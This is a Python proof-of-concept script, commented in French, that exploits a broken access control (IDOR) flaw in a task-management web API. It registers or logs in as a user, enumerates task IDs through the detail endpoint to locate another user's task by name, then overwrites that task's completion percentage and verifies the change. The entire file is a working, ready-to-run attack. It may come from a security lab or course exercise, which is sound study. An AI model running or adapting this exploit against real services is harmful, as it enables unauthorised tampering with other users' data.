import requests
import argparse

# Configuration via arguments en ligne de commande
parser = argparse.ArgumentParser(description="Exploit de contrôle d'accès")
parser.add_argument("--url", required=True, help="URL de base de l'API (ex: http://localhost:8080/api)")
parser.add_argument("--target-task", required=True, help="Nom de la tâche cible à modifier")
parser.add_argument("--percentage", type=int, required=True, help="Nouveau pourcentage")
args = parser.parse_args()

# Configuration dynamique
BASE_URL = args.url
TARGET_TASK_NAME = args.target_task
NEW_PERCENTAGE = args.percentage
USERNAME = "Bob"
PASSWORD = "password"
TEST_TASK_NAME = "Ma tâche"  # Nom constant pour la tâche de test

session = requests.Session()

def signin():
    """Tente de se connecter. Retourne True si réussi, False si l'utilisateur n'existe pas."""
    url = f"{BASE_URL}/id/signin"
    data = {"username": USERNAME, "password": PASSWORD}
    headers = {"Content-Type": "application/json"}
    try:
        response = session.post(url, json=data, headers=headers)
        if response.status_code == 200:
            print(f"[+] Connexion réussie. Cookies : {session.cookies.get_dict()}")
            return True
        elif response.status_code == 400:
            print("[-] Utilisateur non trouvé.")
            return False
        else:
            response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la connexion : {e.response.text if e.response else e}")
        exit(1)

def signup():
    """Inscription de l'utilisateur (appelé seulement si signin() échoue avec 400)."""
    url = f"{BASE_URL}/id/signup"
    data = {"username": USERNAME, "password": PASSWORD}
    headers = {"Content-Type": "application/json"}
    try:
        response = session.post(url, json=data, headers=headers)
        response.raise_for_status()
        print(f"[+] Inscription réussie. Cookies : {session.cookies.get_dict()}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de l'inscription : {e.response.text if e.response else e}")
        exit(1)

def check_test_task_exists():
    """Vérifie si la tâche de test existe déjà."""
    url = f"{BASE_URL}/home"
    try:
        response = session.get(url)
        response.raise_for_status()
        tasks = response.json()
        return any(task.get("name") == TEST_TASK_NAME for task in tasks)
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de vérification des tâches : {e}")
        return False

def create_task_if_needed():
    """Crée la tâche de test seulement si elle n'existe pas déjà."""
    if check_test_task_exists():
        print("[i] Tâche de test existe déjà. Aucune création nécessaire.")
        return
    
    url = f"{BASE_URL}/add"
    data = {"name": TEST_TASK_NAME, "deadline": "2069-05-24T12:12:12"}
    try:
        response = session.post(url, json=data)
        response.raise_for_status()
        print("[+] Tâche de test créée avec succès.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la création de tâche : {e}")
        exit(1)

def get_my_task_id():
    """Récupère l'ID de la tâche de test."""
    url = f"{BASE_URL}/home"
    try:
        response = session.get(url)
        response.raise_for_status()
        tasks = response.json()
        
        for task in tasks:
            if task.get("name") == TEST_TASK_NAME:
                task_id = task.get("id")
                print(f"[+] ID de la tâche de test : {task_id}")
                return task_id
        
        print("[-] Aucune tâche de test trouvée.")
        return None
    except (requests.exceptions.RequestException, KeyError) as e:
        print(f"[-] Échec de récupération de l'ID : {e}")
        exit(1)

def find_target_task_id(max_id):
    """Recherche la tâche cible."""
    for id in range(0, max_id + 1):
        url = f"{BASE_URL}/detail/{id}"
        try:
            response = session.get(url)
            if response.status_code == 200:
                task = response.json()
                if task.get("name") == TARGET_TASK_NAME:
                    print(f"[+] Tâche cible trouvée : ID = {id}")
                    return id
        except requests.exceptions.RequestException as e:
            print(f"[-] Erreur lors de la vérification de l'ID {id} : {e}")
    print("[-] Tâche cible non trouvée.")
    return None

def modify_task_progress(task_id):
    """Modifie le pourcentage de la tâche."""
    url = f"{BASE_URL}/progress/{task_id}/{NEW_PERCENTAGE}"
    try:
        response = session.get(url)
        response.raise_for_status()
        print(f"[+] Pourcentage modifié à {NEW_PERCENTAGE}%.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la modification : {e}")
        exit(1)

def verify_attack(task_id):
    """Vérifie la modification."""
    url = f"{BASE_URL}/detail/{task_id}"
    try:
        response = session.get(url)
        task = response.json()
        current_percentage = task.get("percentageDone")
        print(f"[Vérification] Pourcentage actuel : {current_percentage}%")
        return current_percentage == NEW_PERCENTAGE
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la vérification : {e}")
        return False

if __name__ == "__main__":
    print(f"\n=== Lancement de l'exploit ===")
    print(f"Cible : {TARGET_TASK_NAME} sur {BASE_URL}")
    print(f"Nouveau pourcentage souhaité : {NEW_PERCENTAGE}%\n")
    
    # 1. Authentification
    if not signin():  # Si signin() retourne False (utilisateur inexistant)
        print("[i] Tentative d'inscription...")
        signup()  # Créer le compte
    
    # 2. Gestion de la tâche de test
    create_task_if_needed()  # Ne crée la tâche que si elle n'existe pas
    
    # 3. Exécution de l'exploit
    my_task_id = get_my_task_id()
    target_id = find_target_task_id(my_task_id if my_task_id is not None else 100)  # 100 comme limite arbitraire si aucune tâche
    
    if target_id is not None:
        modify_task_progress(target_id)
        success = verify_attack(target_id)
        
        if success:
            print("\n[✔] SUCCÈS : L'attaque a parfaitement fonctionné !")
            print(f"La tâche '{TARGET_TASK_NAME}' (ID: {target_id}) a été modifiée à {NEW_PERCENTAGE}%")
        else:
            print("\n[✖] ÉCHEC : La modification n'a pas été vérifiée")
    else:
        print("\n[✖] ÉCHEC : Tâche cible introuvable")
